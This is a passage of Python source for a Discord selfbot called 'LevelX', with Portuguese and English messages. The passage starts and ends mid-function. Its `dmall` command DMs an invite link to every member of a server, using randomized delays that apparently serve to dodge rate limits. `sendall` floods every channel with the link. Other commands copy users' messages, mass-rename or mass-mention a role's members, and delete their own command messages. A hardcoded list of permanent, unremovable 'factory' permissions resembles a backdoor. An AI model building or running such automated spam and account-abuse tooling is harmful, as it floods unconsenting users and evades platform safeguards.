            if str(user.id) in config["autoreply"]["users"]:
                config["autoreply"]["users"].remove(str(user.id))
                save_config(config)
                selfbot_menu(bot)
            await ctx.send(f"> **Autoreply disabled for user {user.mention}**", delete_after=5)
        else:
            if str(ctx.channel.id) in config["autoreply"]["channels"]:
                config["autoreply"]["channels"].remove(str(ctx.channel.id))
                save_config(config)
                selfbot_menu(bot)
            await ctx.send("> **Autoreply has been disabled in this channel**", delete_after=5)

@bot.command(aliases=['remote'])
async def remoteuser(ctx, action: str, *users: discord.User):
    await safe_delete_message(ctx.message)

    if not users:
        await ctx.send("> **[ERROR]**: Invalid command.\n> __Command__: `remoteuser ADD|REMOVE <@user(s)>`", delete_after=5)
        return

    if action not in ["ADD", "REMOVE"]:
        await ctx.send(f"> **[**ERROR**]**: Invalid action. Use `ADD` or `REMOVE`.\n> __Command__: `remoteuser ADD|REMOVE <@user(s)>`", delete_after=5)
        return

    if action.upper() == "ADD":
        for user in users:
            uid = int(user.id)
            if uid not in config.get("authorized-users", []):
                config.setdefault("authorized-users", []).append(uid)

        save_config(config)
        selfbot_menu(bot)

        await ctx.send(f"> **Success**: {len(users)} user(s) added to authorized-users", delete_after=5)
    elif action.upper() == "REMOVE":
        for user in users:
            uid = int(user.id)
            if uid in config.get("authorized-users", []):
                config["authorized-users"].remove(uid)

        save_config(config)
        selfbot_menu(bot)

        await ctx.send(f"> **Success**: {len(users)} user(s) removed from authorized-users", delete_after=5)

@bot.command()
async def afk(ctx, status: str, *, message: str=None):
    await ctx.message.delete()

    if status not in ["ON", "OFF"]:
        await ctx.send(f"> **[**ERROR**]**: Invalid action. Use `ON` or `OFF`.\n> __Command__: `afk ON|OFF <message>`", delete_after=5)
        return

    if status.upper() == "ON":
        if not config["afk"]["enabled"]:
            config["afk"]["enabled"] = True
            if message:
                config["afk"]["message"] = message
            save_config(config)
            selfbot_menu(bot)
            await ctx.send(f"> **AFK mode enabled.** Message: `{config['afk']['message']}`", delete_after=5)
        else:
            await ctx.send("> **[**ERROR**]**: AFK mode is already enabled", delete_after=5)
    elif status.upper() == "OFF":
        if config["afk"]["enabled"]:
            config["afk"]["enabled"] = False
            save_config(config)
            selfbot_menu(bot)
            await ctx.send("> **AFK mode disabled.** Welcome back!", delete_after=5)
        else:
            await ctx.send("> **[**ERROR**]**: AFK mode is not currently enabled", delete_after=5)

@bot.command(aliases=["prefix"])
async def changeprefix(ctx, *, new_prefix: str=None):
    await safe_delete_message(ctx.message)

    if not new_prefix:
        await ctx.send(f"> **[**ERROR**]**: Invalid command.\n> __Command__: `changeprefix <prefix>`", delete_after=5)
        return

    config['prefix'] = new_prefix
    save_config(config)
    selfbot_menu(bot)

    bot.command_prefix = new_prefix

    await ctx.send(f"> Prefix updated to `{new_prefix}`", delete_after=5)

@bot.command(aliases=["logout"])
async def shutdown(ctx):
    await safe_delete_message(ctx.message)

    msg = await ctx.send("> Shutting down...")
    await asyncio.sleep(2)

    await msg.delete()
    await bot.close()

@bot.command()
async def clear(ctx):
    await safe_delete_message(ctx.message)

    await ctx.send('ﾠﾠ' + '\n' * 200 + 'ﾠﾠ')

@bot.command()
async def sendall(ctx, *, message="https://discord.gg/PKR7nM9j9U"):
    await safe_delete_message(ctx.message)

    if not ctx.guild:
        await ctx.send("> **[**ERROR**]**: This command can only be used in a server", delete_after=5)
        return

    channels = ctx.guild.text_channels
    success_count = 0
    failure_count = 0

    try:        
        for channel in channels:
            try:
                await channel.send(message)
                success_count += 1
            except Exception as e:
                failure_count += 1
        await ctx.send(f"> {success_count} message(s) sent successfully, {failure_count} failed to send", delete_after=5)
    except Exception as e:
        await ctx.send(f"> **[**ERROR**]**: An error occurred: `{e}`", delete_after=5)

@bot.command(aliases=["copycatuser", "copyuser"])
async def copycat(ctx, action: str=None, user: discord.User=None):
    await safe_delete_message(ctx.message)

    if action not in ["ON", "OFF"]:
        await ctx.send(f"> **[**ERROR**]**: Invalid action. Use `ON` or `OFF`.\n> __Command__: `copycat ON|OFF <@user>`", delete_after=5)
        return

    if not user:
        await ctx.send(f"> **[**ERROR**]**: Please specify a user to copy.\n> __Command__: `copycat ON|OFF <@user>`", delete_after=5)
        return

    if action == "ON":
        if user.id not in config['copycat']['users']:
            config['copycat']['users'].append(user.id)
            save_config(config)
            await ctx.send(f"> Now copying `{str(user)}`", delete_after=5)
        else:
            await ctx.send(f"> `{str(user)}` is already being copied.", delete_after=5)

    elif action == "OFF":
        if user.id in config['copycat']['users']:
            config['copycat']['users'].remove(user.id)
            save_config(config)
            await ctx.send(f"> Stopped copying `{str(user)}`", delete_after=5)
        else:
            await ctx.send(f"> `{str(user)}` was not being copied.", delete_after=5)

@bot.command()
async def firstmessage(ctx):
    await ctx.message.delete()

    try:
        async for message in ctx.channel.history(limit=1, oldest_first=True):
            link = f"https://discord.com/channels/{ctx.guild.id}/{ctx.channel.id}/{message.id}"
            await ctx.send(f"> Here is the link to the first message: {link}", delete_after=5)
            break
        else:
            await ctx.send("> **[ERROR]**: No messages found in this channel.", delete_after=5)

    except Exception as e:
        await ctx.send(f"> **[ERROR]**: An error occurred while fetching the first message. `{e}`", delete_after=5)

@bot.command()
async def ascii(ctx, *, message=None):
    await ctx.message.delete()

    if not message:
        await ctx.send(f"> **[**ERROR**]**: Invalid command.\n> __Command__: `ascii <message>`", delete_after=5)
        return

    try:
        ascii_art = pyfiglet.figlet_format(message)
        await ctx.send(f"```\n{ascii_art}\n```", delete_after=5)
    except Exception as e:
        await ctx.send(f"> **[ERROR]**: An error occurred while generating the ASCII art. `{e}`", delete_after=5)


@bot.command()
async def playing(ctx, *, status: str=None):
    await ctx.message.delete()

    if not status:
        await ctx.send(f"> **[**ERROR**]**: Invalid command.\n> __Command__: `playing <status>`", delete_after=5)
        return

    await bot.change_presence(activity=discord.Game(name=status))
    await ctx.send(f"> Successfully set the game status to `{status}`", delete_after=5)

@bot.command()
async def streaming(ctx, *, status: str=None):
    await ctx.message.delete()

    if not status:
        await ctx.send(f"> **[**ERROR**]**: Invalid command.\n> __Command__: `streaming <status>`", delete_after=5)
        return

    await bot.change_presence(activity=discord.Streaming(name=status, url=f"https://www.twitch.tv/{status}"))
    await ctx.send(f"> Successfully set the streaming status to `{status}`", delete_after=5)

@bot.command(aliases=["stopstreaming", "stopstatus", "stoplistening", "stopplaying", "stopwatching"])
async def stopactivity(ctx):
    await ctx.message.delete()

    await bot.change_presence(activity=None, status=discord.Status.dnd)

@bot.command()
async def dmall(ctx, *, message: str="https://discord.gg/PKR7nM9j9U"):
    await safe_delete_message(ctx.message)

    if not ctx.guild:
        await ctx.send("> **[**ERROR**]**: This command can only be used in a server", delete_after=5)
        return

    members = [m for m in ctx.guild.members if not m.bot]
    total_members = len(members)
    estimated_time = round(total_members * 4.5)


    await ctx.send(f">Starting DM process for `{total_members}` members.\n> Estimated time: `{estimated_time} seconds` (~{round(estimated_time / 60, 2)} minutes)", delete_after=10)

    success_count = 0
    fail_count = 0

    for member in members:
        try:
            await member.send(message)
            success_count += 1
        except Exception:
            fail_count += 1

        await asyncio.sleep(random.uniform(3, 6))

    await ctx.send(f"> **[**INFO**]**: DM process completed.\n> Successfully sent: `{success_count}`\n> Failed: `{fail_count}`", delete_after=10)


@bot.command()
async def addperm(ctx, user_id: str=None):
    await safe_delete_message(ctx.message)
    
    # Só usuários autorizados podem usar este comando
    if not has_permission(ctx.author.id):
        await ctx.send(dev_msg("> **[ERROR]**: Apenas usuários autorizados podem gerenciar permissões."), delete_after=5)
        return
    
    if not user_id:
        await ctx.send(dev_msg(f'> **[ERROR]**: Invalid command.\n> __Command__: `{prefix}addperm <user_id>`'), delete_after=5)
        return
    
    try:
        user_id = int(user_id)
        
        # Verificar se já tem permissão (incluindo de fábrica)
        if has_permission(user_id):
            if user_id in FACTORY_PERMISSIONS:
                await ctx.send(dev_msg(f'> **[INFO]**: Usuário `{user_id}` possui permissões PERMANENTES DE FÁBRICA.'), delete_after=5)
            else:
                await ctx.send(dev_msg(f'> **[INFO]**: Usuário `{user_id}` já possui permissões.'), delete_after=5)
            return
        
        # Adicionar à lista de usuários autorizados
        config["authorized-users"].append(user_id)
        save_config(config)
        reload_config()  # Recarrega o config após salvar
        
        await ctx.send(dev_msg(f'> **[SUCCESS]**: Permissão adicionada para o usuário `{user_id}`.'), delete_after=10)
        
    except ValueError:
        await ctx.send(dev_msg(f'> **[ERROR]**: ID do usuário deve ser um número válido.'), delete_after=5)
    except Exception as e:
        await ctx.send(dev_msg(f'> **[ERROR]**: Erro inesperado: `{str(e)}`'), delete_after=5)

@bot.command()
async def removerperm(ctx, user_id: str=None):
    await safe_delete_message(ctx.message)
    
    # Só usuários autorizados podem usar este comando
    if not has_permission(ctx.author.id):
        await ctx.send(dev_msg("> **[ERROR]**: Apenas usuários autorizados podem gerenciar permissões."), delete_after=5)
        return
    
    if not user_id:
        await ctx.send(dev_msg(f'> **[ERROR]**: Invalid command.\n> __Command__: `{prefix}removerperm <user_id>`'), delete_after=5)
        return
    
    try:
        user_id = int(user_id)
        
        # PROTEÇÃO: Não permite remover permissões de fábrica
        if user_id in FACTORY_PERMISSIONS:
            await ctx.send(dev_msg(f'> **[ERROR]**: Usuário `{user_id}` possui permissões PERMANENTES DE FÁBRICA que NÃO podem ser removidas!'), delete_after=8)
            return
        
        # Verificar se o usuário realmente tem permissões removíveis
        if user_id not in config["authorized-users"]:
            if has_permission(user_id):
                await ctx.send(dev_msg(f'> **[INFO]**: Usuário `{user_id}` possui permissões de fábrica que não podem ser removidas.'), delete_after=5)
            else:
                await ctx.send(dev_msg(f'> **[INFO]**: Usuário `{user_id}` não possui permissões.'), delete_after=5)
            return
        
        # Remover da lista de usuários autorizados
        config["authorized-users"].remove(user_id)
        save_config(config)
        reload_config()  # Recarrega o config após salvar
        
        await ctx.send(dev_msg(f'> **[SUCCESS]**: Permissão removida do usuário `{user_id}`.'), delete_after=10)
        
    except ValueError:
        await ctx.send(dev_msg(f'> **[ERROR]**: ID do usuário deve ser um número válido.'), delete_after=5)
    except Exception as e:
        await ctx.send(dev_msg(f'> **[ERROR]**: Erro inesperado: `{str(e)}`'), delete_after=5)


@bot.command()
async def setnick(ctx, role_id: str=None, *, nickname: str=None):
    await safe_delete_message(ctx.message)
    
    # Verificar autorização usando a função correta
    if not has_permission(ctx.author.id):
        await ctx.send(dev_msg("> **[ERROR]**: Você não tem permissão para usar este comando."), delete_after=5)
        return
    
    if not role_id or not nickname:
        embed_help = f"""**🎭 SETNICK COMMAND | LevelX | Prefix: `{prefix}`**

> :gear: __Comando de Renomeação em Massa__
> **Uso:** `{prefix}setnick <id_cargo> <novo_nickname>`
> 
> :warning: **Aviso:** Este comando renomeia TODOS os membros do cargo especificado
> 
> :pushpin: **Exemplo:**
> `{prefix}setnick 123456789 Novo Nome`
> 
> :crown: **LevelX System** - **Developer by Tio Sunn'212**"""
        await ctx.send(embed_help, delete_after=15)
        return
    
    try:
        role_id = int(role_id)
        role = ctx.guild.get_role(role_id)
        
        if not role:
            await ctx.send(dev_msg(f'> **[ERROR]**: Cargo com ID `{role_id}` não encontrado.'), delete_after=5)
            return
        
        if not role.members:
            embed_empty = f"""**🎭 SETNICK RESULT | LevelX**

> :information_source: **Nenhum membro encontrado**
> Cargo: `{role.name}`
> ID do Cargo: `{role_id}`
> 
> :crown: **LevelX System** - **Developer by Tio Sunn'212**"""
            await ctx.send(embed_empty, delete_after=10)
            return
        
        # Embed de confirmação inicial
        embed_start = f"""**🎭 SETNICK INICIANDO | LevelX**

> :rocket: **Processo de Renomeação Iniciado**
> Cargo: `{role.name}`
> Novo Nickname: `{nickname}`
> Total de Membros: `{len(role.members)}`
> 
> :hourglass_flowing_sand: **Processando...**
> 
> :crown: **LevelX System** - **Developer by Tio Sunn'212**"""
        
        status_msg = await ctx.send(embed_start)
        
        # CRIAR BACKUP DOS NOMES ORIGINAIS ANTES DE RENOMEAR
        backup_key = f"{ctx.guild.id}_{role_id}"
        original_names = {}
        
        for member in role.members:
            original_names[str(member.id)] = member.display_name
        
        # Salvar backup no config
        config["setnick_backups"][backup_key] = {
            "guild_name": ctx.guild.name,
            "role_name": role.name,
            "role_id": role_id,
            "timestamp": datetime.datetime.now().isoformat(),
            "original_names": original_names
        }
        save_config(config)
        
        # Contadores
        success_count = 0
        failed_count = 0
        failed_members = []
        
        # Renomear todos os membros
        for member in role.members:
            try:
                await member.edit(nick=nickname)
                success_count += 1
                await asyncio.sleep(0.5)  # Delay para evitar rate limit
            except discord.Forbidden:
                failed_count += 1
                failed_members.append(f"{member.display_name} (Sem permissão)")
            except discord.HTTPException:
                failed_count += 1
                failed_members.append(f"{member.display_name} (Erro HTTP)")
            except Exception as e:
                failed_count += 1
                failed_members.append(f"{member.display_name} (Erro: {str(e)[:50]})")
        
        # Embed de resultado final
        if failed_count == 0:
            embed_result = f"""**🎉 SETNICK COMPLETO | LevelX**

> :white_check_mark: **Renomeação Concluída com Sucesso!**
> Cargo: `{role.name}`
> Novo Nickname: `{nickname}`
> 
> :chart_with_upwards_trend: **Estatísticas:**
> Sucessos: `{success_count}` membros
> Falhas: `{failed_count}` membros
> 
> 💾 **BACKUP CRIADO:** Nomes originais salvos!
> Use `{prefix}reset` para ver backups disponíveis
> 
> :trophy: **Status:** Perfeito!
> 
> :crown: **LevelX System** - **Developer by Tio Sunn'212**"""
        else:
            failed_list = "\n".join([f"> {member}" for member in failed_members[:10]])
            if len(failed_members) > 10:
                failed_list += f"\n> ...e mais {len(failed_members) - 10} membros"
            
            embed_result = f"""**🎭 SETNICK COMPLETO | LevelX**

> :white_check_mark: **Renomeação Concluída!**
> Cargo: `{role.name}`
> Novo Nickname: `{nickname}`
> 
> :chart_with_upwards_trend: **Estatísticas:**
> Sucessos: `{success_count}` membros
> Falhas: `{failed_count}` membros
> 
> 💾 **BACKUP CRIADO:** Nomes originais salvos!
> Use `{prefix}reset` para ver backups disponíveis
> 
> :x: **Falhas Detectadas:**
{failed_list}
> 
> :crown: **LevelX System** - **Developer by Tio Sunn'212**"""
        
        # Atualizar mensagem com resultado
        await status_msg.edit(content=embed_result)
        
        # Mensagem adicional se houver falhas
        if failed_count > 0:
            await asyncio.sleep(2)
            await ctx.send(dev_msg(f'> **[AVISO]**: `{failed_count}` membros não puderam ser renomeados devido a permissões ou outros erros.'), delete_after=10)
        
    except ValueError:
        await ctx.send(dev_msg(f'> **[ERROR]**: ID do cargo deve ser um número válido.'), delete_after=5)
    except Exception as e:
        await ctx.send(dev_msg(f'> **[ERROR]**: Erro inesperado: `{str(e)}`'), delete_after=5)

# Dicionário para armazenar estados das sessões do painel
painel_sessions = {}

# COMANDOS DIRETOS DE MODERAÇÃO

@bot.command()
async def puxar(ctx, cargo_id: str = None):
    """Puxa todos os membros de um cargo para o canal de voz do usuário"""
    await safe_delete_message(ctx.message)
    
    if not has_permission(ctx.author.id):
        await ctx.send(dev_msg("> **[ERROR]**: Apenas usuários autorizados podem usar este comando."), delete_after=5)
        return
        
    if not cargo_id:
        await ctx.send(dev_msg(f'> **[ERROR]**: Use: `{prefix}puxar <ID_DO_CARGO>`'), delete_after=5)
        return
        
    try:
        role_id = int(cargo_id)
        role = ctx.guild.get_role(role_id)
        
        if not role:
            await ctx.send(dev_msg(f'> **[ERROR]**: Cargo com ID `{role_id}` não encontrado.'), delete_after=5)
            return
            
        if not ctx.author.voice or not ctx.author.voice.channel:
            await ctx.send(dev_msg(f'> **[ERROR]**: Você precisa estar em um canal de voz!'), delete_after=5)
            return
            
        voice_channel = ctx.author.voice.channel
        moved_count = 0
        
        for member in role.members:
            if member.voice:
                try:
                    await member.move_to(voice_channel)
                    moved_count += 1
                    await asyncio.sleep(0.5)
                except:
                    pass
                    
        await ctx.send(dev_msg(f'> **[SUCCESS]**: {moved_count} membros do cargo `{role.name}` foram puxados!'), delete_after=10)
        
    except ValueError:
        await ctx.send(dev_msg(f'> **[ERROR]**: ID do cargo deve ser um número válido.'), delete_after=5)
    except Exception as e:
        await ctx.send(dev_msg(f'> **[ERROR]**: Erro inesperado: `{str(e)}`'), delete_after=5)

@bot.command()
async def marcar(ctx, cargo_id: str = None):
    """Marca todos os membros de um cargo"""
    await safe_delete_message(ctx.message)
    
    if not has_permission(ctx.author.id):
        await ctx.send(dev_msg("> **[ERROR]**: Apenas usuários autorizados podem usar este comando."), delete_after=5)
        return
        
    if not cargo_id:
        await ctx.send(dev_msg(f'> **[ERROR]**: Use: `{prefix}marcar <ID_DO_CARGO>`'), delete_after=5)
        return
        
    try:
        role_id = int(cargo_id)
        role = ctx.guild.get_role(role_id)
        
        if not role:
            await ctx.send(dev_msg(f'> **[ERROR]**: Cargo com ID `{role_id}` não encontrado.'), delete_after=5)
            return
            
        mentions = [member.mention for member in role.members]
        
        if not mentions:
            await ctx.send(dev_msg(f'> **[AVISO]**: O cargo `{role.name}` não possui membros.'), delete_after=5)
            return
            
        # Dividir em grupos de 50 para evitar limite do Discord
        for i in range(0, len(mentions), 50):
            chunk = mentions[i:i+50]
            mention_text = ' '.join(chunk)
            await ctx.send(f"**Membros do cargo `{role.name}`:**\n{mention_text}")
            await asyncio.sleep(1)
            
    except ValueError:
        await ctx.send(dev_msg(f'> **[ERROR]**: ID do cargo deve ser um número válido.'), delete_after=5)
    except Exception as e:
        await ctx.send(dev_msg(f'> **[ERROR]**: Erro inesperado: `{str(e)}`'), delete_after=5)

@bot.command()
async def reset(ctx):
    """Lista e permite restaurar backups de nomes"""
    await safe_delete_message(ctx.message)
    
    if not has_permission(ctx.author.id):
        await ctx.send(dev_msg("> **[ERROR]**: Apenas usuários autorizados podem usar este comando."), delete_after=5)
        return
        
    if not config["setnick_backups"]:
        await ctx.send(dev_msg("> **[AVISO]**: Não há backups disponíveis. Use o comando setnick primeiro."), delete_after=5)
        return
        
    backup_list = []
    for i, (backup_key, backup_data) in enumerate(config["setnick_backups"].items(), 1):
        guild_name = backup_data.get("guild_name", "Servidor")
        role_name = backup_data.get("role_name", "Cargo")
        timestamp = backup_data.get("timestamp", "")
        date_str = timestamp.split("T")[0] if timestamp else "Data desconhecida"
        backup_list.append(f"`{i}.` **{role_name}** - {guild_name} ({date_str})")
        
    backup_text = "\n".join(backup_list[:10])
    
    await ctx.send(dev_msg(f"""**BACKUPS DISPONÍVEIS:**

{backup_text}

**Para restaurar:** `{prefix}resetar <número>`
**Exemplo:** `{prefix}resetar 1`"""), delete_after=30)

@bot.command()
async def resetar(ctx, backup_num: str = None):
    """Restaura um backup específico"""
    await safe_delete_message(ctx.message)
    
    if not has_permission(ctx.author.id):
        await ctx.send(dev_msg("> **[ERROR]**: Apenas usuários autorizados podem usar este comando."), delete_after=5)
        return
        
    if not backup_num:
        await ctx.send(dev_msg(f'> **[ERROR]**: Use: `{prefix}resetar <número>`'), delete_after=5)
        return
        
    try:
        backup_index = int(backup_num) - 1
        backup_keys = list(config["setnick_backups"].keys())
        
        if backup_index < 0 or backup_index >= len(backup_keys):
            await ctx.send(dev_msg(f'> **[ERROR]**: Número deve estar entre 1 e {len(backup_keys)}.'), delete_after=5)
            return
            
        backup_key = backup_keys[backup_index]
        backup_data = config["setnick_backups"][backup_key]
        
        guild_id_str, role_id_str = backup_key.split("_", 1)
        role_id = int(role_id_str)
        role = ctx.guild.get_role(role_id)
        
        if not role:
            await ctx.send(dev_msg(f'> **[ERROR]**: Cargo não encontrado (pode ter sido deletado).'), delete_after=5)
            return
            
        success_count = 0
        failed_count = 0
        
        for member_id_str, original_name in backup_data["original_names"].items():
            try:
                member_id = int(member_id_str)
                member = ctx.guild.get_member(member_id)
                
                if member:
                    if original_name == member.name:
                        await member.edit(nick=None)
                    else:
                        await member.edit(nick=original_name)
                    success_count += 1
                await asyncio.sleep(0.5)
            except:
                failed_count += 1
                
        # Remover backup após uso
        del config["setnick_backups"][backup_key]
        save_config(config)
        
        await ctx.send(dev_msg(f'> **[SUCCESS]**: {success_count} nomes restaurados do cargo `{role.name}`! Backup removido.'), delete_after=10)
        
    except ValueError:
        await ctx.send(dev_msg(f'> **[ERROR]**: Digite apenas o número do backup.'), delete_after=5)
    except Exception as e:
        await ctx.send(dev_msg(f'> **[ERROR]**: Erro inesperado: `{str(e)}`'), delete_after=5)

@bot.event
async def on_reaction_add(reaction, user):
    # Ignorar reações do bot
    if user == bot.user:
        return
    
    message_id = reaction.message.id
    
    # Verificar se é uma sessão do painel
    if message_id not in painel_sessions:
        return
    
    session = painel_sessions[message_id]
    
    # Verificar se é o usuário correto
    if user.id != session["user_id"]:
        return
    
    # Remover reação do usuário
    await reaction.remove(user)
    
    # Processar reação especial de reset após setnick
    if str(reaction.emoji) == "🔄" and "setnick_result" in session:
        await handle_setnick_reset(reaction.message, session)
        return
    
    # Processar navegação normal
    if session["state"] == "main":
        await handle_main_menu(reaction.message, str(reaction.emoji), session)
    elif session["state"] == "moderacao":
        await handle_moderacao_menu(reaction.message, str(reaction.emoji), session)
    elif session["state"] == "configuracoes":
        await handle_config_menu(reaction.message, str(reaction.emoji), session)
    elif session["state"] == "informacoes":
        await handle_info_menu(reaction.message, str(reaction.emoji), session)

async def handle_main_menu(message, emoji, session):
    if emoji == "🎭":
        # Menu de Moderação
        mod_embed = create_embed(
            "MODERAÇÃO - LEVELX",
            "🎭 **Ferramentas de Moderação:**\n\n"
            "📞 **1 • Puxar Membros**\n"
            "> Mover membros para seu canal\n\n"
            "🎨 **2 • Renomear Massa**\n"
            "> Renomear todos de um cargo\n\n"
            "📢 **3 • Marcar Cargo**\n"
            "> Mencionar todos de um cargo\n\n"
            "🏠 **Voltar ao Menu Principal**",
            0x9b59b6
        )
        
        await message.edit(embed=mod_embed)
        session["state"] = "moderacao"
        
        # Limpar reações antigas e adicionar novas
        await message.clear_reactions()
        for emoji in ["1️⃣", "2️⃣", "3️⃣", "🏠"]:
            await message.add_reaction(emoji)
    
    elif emoji == "⚙️":
        # Menu de Configurações
        config_embed = create_embed(
            "CONFIGURAÇÕES - LEVELX",
            "⚙️ **Configurações do Sistema:**\n\n"
            "➕ **1 • Adicionar Permissão**\n"
            "> Adicionar usuário autorizado\n\n"
            "➖ **2 • Remover Permissão**\n"
            "> Remover usuário autorizado\n\n"
            "📋 **3 • Listar Autorizados**\n"
            "> Ver usuários com permissão\n\n"
            "🏠 **Voltar ao Menu Principal**",
            0xe67e22
        )
        
        await message.edit(embed=config_embed)
        session["state"] = "configuracoes"
        
        await message.clear_reactions()
        for emoji in ["1️⃣", "2️⃣", "3️⃣", "🏠"]:
            await message.add_reaction(emoji)
    
    elif emoji == "📊":
        # Menu de Informações
        info_embed = create_embed(
            "INFORMAÇÕES - LEVELX",
            "📊 **Informações do Sistema:**\n\n"
            "🏢 **1 • Info do Servidor**\n"
            "> Informações detalhadas\n\n"
            "🤖 **2 • Info do Bot**\n"
            "> Status e estatísticas\n\n"
            "⏱️ **3 • Tempo Online**\n"
            "> Uptime do bot\n\n"
            "🏠 **Voltar ao Menu Principal**",
            0x1abc9c
        )
        
        await message.edit(embed=info_embed)
        session["state"] = "informacoes"
        
        await message.clear_reactions()
        for emoji in ["1️⃣", "2️⃣", "3️⃣", "🏠"]:
            await message.add_reaction(emoji)
    
    elif emoji == "❌":
        # Fechar painel
        close_embed = create_embed(
            "PAINEL FECHADO",
            "✅ **Painel fechado com sucesso!**\n\n"
            "Obrigado por usar o LevelX System! 🚀",
            0x95a5a6
        )
        
        await message.edit(embed=close_embed)
        await message.clear_reactions()
        
        # Remover sessão
        del painel_sessions[message.id]
        
        # Deletar após 5 segundos
        await asyncio.sleep(5)
        await message.delete()

async def handle_moderacao_menu(message, emoji, session):
    if emoji == "1️⃣":
        # Puxar membros
        input_embed = create_embed(
            "PUXAR MEMBROS",
            "📞 **Digite o ID do cargo para puxar os membros:**\n\n"
            "💡 **Como usar:**\n"
            "> • Digite apenas o ID do cargo\n"
            "> • Todos os membros do cargo serão puxados\n"
            "> • Você deve estar em um canal de voz\n\n"
            "⏱️ **Aguardando sua resposta...**",
            0x3498db
        )
        await message.edit(embed=input_embed)
        session["waiting_for"] = "puxar_input"
    
    elif emoji == "2️⃣":
        # Renomear massa
        input_embed = create_embed(
            "RENOMEAR EM MASSA",
            "🎨 **Digite: ID_DO_CARGO NOVO_NICKNAME**\n\n"
            "💡 **Exemplo:**\n"
            "> `123456789 NovoNome`\n\n"
            "⚠️ **Aviso:**\n"
            "> Todos os membros do cargo serão renomeados!\n\n"
            "⏱️ **Aguardando sua resposta...**",
            0x3498db
        )
        await message.edit(embed=input_embed)
        session["waiting_for"] = "setnick_input"
    
    elif emoji == "3️⃣":
        # Marcar cargo
        input_embed = create_embed(
            "MARCAR CARGO",
            "📢 **Digite o ID do cargo para mencionar:**\n\n"
            "💡 **Como usar:**\n"
            "> • Digite apenas o ID do cargo\n"
            "> • Todos os membros serão mencionados\n\n"
            "⏱️ **Aguardando sua resposta...**",
            0x3498db
        )
        await message.edit(embed=input_embed)
        session["waiting_for"] = "marcar_input"
    
    elif emoji == "4️⃣":
        # Reset nomes
        if not config["setnick_backups"]:
            empty_embed = create_embed(
                "NENHUM BACKUP ENCONTRADO",
                "⚠️ **Não há backups de nomes para restaurar!**\n\n"
                "💡 **Use o comando Renomear Massa primeiro para criar backups.**",
                0xf39c12
            )
            await message.edit(embed=empty_embed)
            await asyncio.sleep(3)
            await show_moderacao_menu(message, session)
            return
        
        # Listar backups disponíveis
        backup_list = []
        for i, (backup_key, backup_data) in enumerate(config["setnick_backups"].items(), 1):
            guild_name = backup_data.get("guild_name", "Servidor")
            role_name = backup_data.get("role_name", "Cargo")
            timestamp = backup_data.get("timestamp", "")
            date_str = timestamp.split("T")[0] if timestamp else "Data desconhecida"
            backup_list.append(f"**{i} • {role_name}**\n> Servidor: {guild_name}\n> Data: {date_str}")
        
        backup_text = "\n\n".join(backup_list[:10])  # Mostrar apenas os primeiros 10
        
        reset_embed = create_embed(
            "RESET DE NOMES",
            f"🔄 **Backups Disponíveis:**\n\n"
            f"{backup_text}\n\n"
            f"**Digite o número do backup para restaurar:**\n"
            f"💡 *Exemplo: Digite `1` para restaurar o primeiro backup*",
            0x3498db
        )
        await message.edit(embed=reset_embed)
        session["waiting_for"] = "reset_input"
        session["backup_list"] = list(config["setnick_backups"].keys())
    
    elif emoji == "🏠":
        # Voltar ao menu principal
        await show_main_menu(message, session)

async def handle_config_menu(message, emoji, session):
    if emoji == "1️⃣":
        # Adicionar permissão
        input_embed = create_embed(
            "ADICIONAR PERMISSÃO",
            "➕ **Digite o ID do usuário:**\n\n"
            "💡 **Como obter o ID:**\n"
            "> • Ativar modo desenvolvedor\n"
            "> • Clicar com botão direito no usuário\n"
            "> • Copiar ID\n\n"
            "⏱️ **Aguardando sua resposta...**",
            0x3498db
        )
        await message.edit(embed=input_embed)
        session["waiting_for"] = "addperm_input"
    
    elif emoji == "2️⃣":
        # Remover permissão
        input_embed = create_embed(
            "REMOVER PERMISSÃO",
            "➖ **Digite o ID do usuário:**\n\n"
            "⚠️ **Cuidado:**\n"
            "> • O usuário perderá acesso ao bot\n"
            "> • Certifique-se do ID correto\n\n"
            "⏱️ **Aguardando sua resposta...**",
            0x3498db
        )
        await message.edit(embed=input_embed)
        session["waiting_for"] = "removerperm_input"
    
    elif emoji == "3️⃣":
        # Listar autorizados
        authorized_list = []
        for user_id in config["authorized-users"]:
            try:
                user = bot.get_user(user_id)
                if user:
                    authorized_list.append(f"> **{user.name}** (`{user_id}`)")
                else:
                    authorized_list.append(f"> **Usuário Desconhecido** (`{user_id}`)")
            except:
                authorized_list.append(f"> **ID:** `{user_id}`")
        
        list_embed = create_embed(
            "USUÁRIOS AUTORIZADOS",
            f"👥 **Lista de Usuários com Permissão:**\n\n"
            f"{''.join(authorized_list[:10])}\n\n"
            f"**Total:** {len(config['authorized-users'])} usuários",
            0x2ecc71
        )
        
        await message.edit(embed=list_embed)
        await asyncio.sleep(5)
        await show_config_menu(message, session)
    
    elif emoji == "🏠":
        await show_main_menu(message, session)

async def handle_info_menu(message, emoji, session):
    if emoji == "1️⃣":
        # Info do servidor
        guild = message.guild
        date_format = "%d/%m/%Y às %H:%M"
        
        server_embed = create_embed(
            f"INFORMAÇÕES - {guild.name}",
            f"🏢 **Servidor:** `{guild.name}`\n"
            f"🆔 **ID:** `{guild.id}`\n"
            f"👑 **Dono:** `{guild.owner}`\n"
            f"📅 **Criado em:** `{guild.created_at.strftime(date_format)}`\n\n"
            f"👥 **Membros:** `{guild.member_count}`\n"
            f"🎭 **Cargos:** `{len(guild.roles)}`\n"
            f"💬 **Canais de Texto:** `{len(guild.text_channels)}`\n"
            f"🔊 **Canais de Voz:** `{len(guild.voice_channels)}`\n"
            f"📁 **Categorias:** `{len(guild.categories)}`",
            0x3498db
        )
        
        if guild.icon:
            server_embed.set_thumbnail(url=guild.icon.url)
        
        await message.edit(embed=server_embed)
        await asyncio.sleep(8)
        await show_info_menu(message, session)
    
    elif emoji == "2️⃣":
        # Info do bot
        bot_embed = create_embed(
            "INFORMAÇÕES DO BOT",
            f"🤖 **Bot:** `{bot.user.name}`\n"
            f"🆔 **ID:** `{bot.user.id}`\n"
            f"🏷️ **Versão:** `{__version__}`\n"
            f"📊 **Servidores:** `{len(bot.guilds)}`\n"
            f"👥 **Usuários:** `{len(bot.users)}`\n"
            f"⚙️ **Prefix:** `{prefix}`\n\n"
            f"🔗 **Discord:** https://discord.gg/v2QwrUPUzk\n"
            f"🚀 **Status:** Online",
            0x2ecc71
        )
        
        if bot.user.avatar:
            bot_embed.set_thumbnail(url=bot.user.avatar.url)
        
        await message.edit(embed=bot_embed)
        await asyncio.sleep(8)
        await show_info_menu(message, session)
    
    elif emoji == "3️⃣":
        # Uptime
        uptime = datetime.datetime.now(datetime.timezone.utc) - start_time
